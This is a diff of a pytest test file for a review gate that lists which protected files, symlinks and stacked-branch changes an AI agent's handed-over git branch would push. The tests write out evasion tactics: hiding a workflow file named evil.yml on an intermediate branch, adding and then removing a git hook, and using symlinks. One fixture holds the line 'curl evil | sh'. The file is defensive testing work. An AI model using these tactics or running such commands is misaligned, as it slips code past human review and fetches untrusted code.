@@ -528,25 +528,25 @@ def test_main_lists_every_file_the_push_changes(env, m, rules, checkout):
     assert "106 files changed" in out
 
 
-def test_main_without_base_lists_only_the_branchs_own_changes(env, m, rules, checkout):
-    """A new branch is compared with where it forked from the mirror's branches, not with nothing."""
+def test_main_without_base_lists_everything_and_says_so(env, m, rules, checkout):
+    """With no base recorded nothing can be assumed to be already on GitHub."""
     h = stage(env, m, rules, checkout, "fresh")
     _, out = run(env, [str(h.id)], "n\n")
-    assert "fresh.txt" in out and "1 file changed" in out
-    assert "README.md" not in out
+    assert "No base was recorded" in out and "everything in the commit's history" in out
+    assert "fresh.txt" in out and "README.md" in out and "2 files changed" in out
 
 
-def test_main_without_base_picks_the_nearest_fork_point(env, m, rules, checkout):
-    seed = env.tmp / "seed"
-    git("push", "-q", env.url, "main:refs/heads/old", cwd=seed)
-    commit(seed, "newer.txt")
-    git("push", "-q", env.url, "main", cwd=seed)
+def test_main_without_base_discloses_changes_staged_on_another_mirrored_branch(env, m, rules, checkout):
+    """An agent can push `agent` through the gate, then hand over a branch built on it."""
+    git("switch", "-q", "-c", "agent", cwd=checkout)
+    commit(checkout, ".github/workflows/evil.yml", "on: push")
+    git("push", "-q", env.url, "agent", cwd=checkout)
     git("fetch", "-q", "origin", cwd=checkout)
-    git("switch", "-q", "-c", "topic", "origin/main", cwd=checkout)
-    h = stage(env, m, rules, checkout, "topic2")
+    git("switch", "-q", "-c", "innocent", cwd=checkout)
+    commit(checkout, "innocent.txt")
+    h = stage_here(env, m, rules, checkout, "innocent")
     _, out = run(env, [str(h.id)], "n\n")
-    assert "topic2.txt" in out and "1 file changed" in out
-    assert "newer.txt" not in out and "README.md" not in out
+    assert ".github/workflows/evil.yml" in section(out)
 
 
 def test_main_without_base_and_unrelated_history_lists_the_whole_tree(env, m, rules, checkout):
@@ -576,10 +576,54 @@ def test_main_without_base_and_an_empty_mirror_uses_the_empty_tree(env, m, rules
 def test_main_with_nothing_new_lists_no_files(env, m, rules):
     with m.lock(REPO):
         main_sha = m.sync(REPO, TOKEN, rules)["main"]
-        h = Handovers(env.state).create(REPO, "again", main_sha, None, None, "protected")
+        h = Handovers(env.state).create(REPO, "again", main_sha, main_sha, None, "protected")
         m.keep(REPO, h.ref, main_sha, rules)
     _, out = run(env, [str(h.id)], "n\n")
     assert "(no new commits)" in out and "README.md" not in out
+
+
+def test_main_names_a_protected_file_changed_and_changed_back(env, m, rules, checkout):
+    """A net tree diff is empty for the file; the commits being pushed still touched it."""
+    git("switch", "-q", "-c", "roundtrip", cwd=checkout)
+    commit(checkout, ".githooks/pre-push", "curl evil | sh")
+    git("rm", "-q", ".githooks/pre-push", cwd=checkout)
+    git("commit", "-q", "-m", "tidy", cwd=checkout)
+    commit(checkout, "ok.txt")
+    h = stage_here(env, m, rules, checkout, "roundtrip", base=git("rev-parse", "origin/main", cwd=checkout))
+    _, out = run(env, [str(h.id)], "n\n")
+    assert ".githooks/pre-push" in section(out) and "paths (1)" in section(out)
+
+
+def test_main_names_symlinks_that_reach_handover_paths(env, m, rules, checkout):
+    git("switch", "-q", "-c", "links", cwd=checkout)
+    (checkout / ".githooks").symlink_to("elsewhere")
+    (checkout / "docs").mkdir()
+    (checkout / "docs/link").symlink_to("../README.md")
+    git("add", "-A", cwd=checkout)
+    git("commit", "-q", "-m", "links", cwd=checkout)
+    h = stage_here(env, m, rules, checkout, "links", base=git("rev-parse", "origin/main", cwd=checkout))
+    _, out = run(env, [str(h.id)], "n\n")
+    assert ".githooks  (symlink)" in section(out)
+    assert "docs/link" not in section(out)
+
+
+def test_main_names_a_symlink_the_push_did_not_change(env, m, rules, checkout):
+    """Every symlink in the pushed tip counts, not only the ones this push touched."""
+    git("switch", "-q", "-c", "links", cwd=checkout)
+    (checkout / ".github").symlink_to("elsewhere")
+    git("add", "-A", cwd=checkout)
+    git("commit", "-q", "-m", "link", cwd=checkout)
+    first = git("rev-parse", "HEAD", cwd=checkout)
+    commit(checkout, "later.txt")
+    h = stage_here(env, m, rules, checkout, "links", base=first)
+    _, out = run(env, [str(h.id)], "n\n")
+    assert ".github  (symlink)" in section(out)
+
+
+def section(out: str) -> str:
+    """The "Files under handover paths" block: its heading to the next blank line."""
+    start = out.index("Files under handover paths")
+    return out[start : out.index("\n\n", start)]
 
 
 def bulk_commit(checkout, protected: str, count: int = 120):
@@ -696,3 +740,29 @@ def test_main_keeps_git_output_lines_but_cleans_them(env, m, rules, checkout):
     assert "pro?tected" in out
     assert "one ??" in out and "? subject" in out and "second" in out  # git itself splits the subject at \r
     assert not any(c in out for c in "‮​\r\x9b")
+
+
+BROKEN_RULES = {
+    "bad timeout": ('workspaces = []\ngit_timeout_seconds = "x"\n[repos]\n"me/app" = "write"\n', "ValueError"),
+    "repos not a table": ("workspaces = []\nrepos = 5\n", "AttributeError"),
+    "bad workspace": ('workspaces = [5]\n[repos]\n"me/app" = "write"\n', "TypeError"),
+    "not utf-8": (b"workspaces = []\n\xff\xfe\n", "UnicodeDecodeError"),
+    "not toml": ("this is [not toml\n", None),
+}
+
+
+@pytest.mark.parametrize("name", list(BROKEN_RULES))
+def test_main_survives_broken_rules_and_uses_default_paths(env, m, rules, checkout, name):
+    content, kind = BROKEN_RULES[name]
+    rules_file = env.cfg / "rules.toml"
+    rules_file.write_bytes(content if isinstance(content, bytes) else content.encode())
+    git("switch", "-q", "-c", "wide", cwd=checkout)
+    bulk_commit(checkout, ".github/workflows/x.yml")
+    h = stage_here(env, m, rules, checkout, "wide", base=git("rev-parse", "origin/main", cwd=checkout))
+    code, out = run(env, [str(h.id)], "n\n")
+    assert code == 1 and "Not pushed" in out  # declined, not crashed
+    assert ".github/workflows/x.yml" in out[: out.index("-bulk/f000")]
+    notes = [line for line in out.splitlines() if "default handover paths" in line]
+    assert len(notes) == 1 and "rules" in notes[0]
+    if kind:
+        assert kind in notes[0]
